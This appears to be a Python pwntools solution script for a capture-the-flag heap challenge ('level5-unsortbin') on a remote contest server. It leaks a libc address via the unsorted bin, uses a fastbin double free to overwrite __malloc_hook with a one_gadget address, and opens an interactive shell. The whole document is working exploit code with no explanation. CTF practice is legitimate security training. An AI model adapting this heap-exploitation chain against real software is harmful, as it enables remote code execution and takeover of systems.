from pwn import *

context.log_level="debug"

def add(size):
    r.sendlineafter('>> ', '1')
    r.sendlineafter(':', str(size))
def dele(idx):
    r.sendlineafter('>> ', '4')
    r.sendlineafter(':', str(idx))
def show(idx):
    r.sendlineafter('>> ', '2')
    r.sendlineafter(':', str(idx))
def edit(idx, data):
    r.sendlineafter('>> ', '3')
    r.sendlineafter(':', str(idx))
    r.sendlineafter(':', data)
def exploit(r): 
    add(512) # 0 
    add(20) # 1
    dele(0)
    show(0)
    arena=u64(r.recv(6)+'\x00\x00')
    a=arena-0x3c4b78    # offset fount in gdb
    libc.address=a

    add(0x68) # 2 
    add(0x68) # 3
    dele(2)
    dele(3)
    dele(2)
    add(0x68)
    edit(4, p64(libc.sym['__malloc_hook']-19))
    add(0x68)
    add(0x68)
    add(0x68)
    edit(7, 'a'*3 + p64(libc.address + 0xf02a4))
    dele(2)
    dele(2)

#r=process("./level5-unsortbin")
r=remote("pwn.sixstars.team",22505)
elf=ELF("./level5-unsortbin")
libc=ELF("./libc.so.6")
#print r.pid
#pause()
exploit(r)
r.interactive()
